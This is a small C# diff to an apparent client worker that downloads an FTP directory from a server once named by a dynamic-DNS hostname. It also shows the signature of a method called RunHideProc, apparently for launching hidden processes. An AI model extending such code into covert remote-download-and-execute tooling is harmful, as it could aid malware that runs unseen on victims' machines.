@@ -13,7 +13,7 @@ namespace ClientWorker
         public static void DownloadFloader(string floader, string localPath)
         {
             Log.Send("DownloadFloader("+ floader + ","+ localPath+")");
-            FtpClient.DownloadFtpDirectory("ftp://" + StartData.ddnsHostName[1] + "/" + floader, localPath);
+            FtpClient.DownloadFtpDirectory("ftp://" + StartData.currentServer + "/" + floader, localPath);
         }
 
         public static void RunHideProc(string fileName)
